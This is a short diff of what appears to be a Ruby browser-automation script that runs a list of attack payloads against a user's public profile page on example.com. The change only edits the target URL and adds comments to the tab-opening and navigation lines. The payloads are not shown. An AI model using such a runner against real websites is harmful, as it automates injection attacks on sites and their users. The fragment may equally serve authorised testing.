@@ -366,9 +366,9 @@ payloads =
 puts "[*] Exploitation start"
 puts "[*] Number of payloads: #{payloads.size} payloads" 
 
-@browser.send_keys(:control, 't')
-@browser.goto "http://example.com/public_profiles/user/silver.aspx"
-@browser.switch 
+@browser.send_keys(:control, 't')                               # Sent ctrl+T to open new tab
+@browser.goto "http://example.com/pub_prof/user/silver.aspx"    # Goto the use's public profile
+@browser.switch                                                 # Make sure to focus on current tab/window
 
 payloads.each do |payload|
   
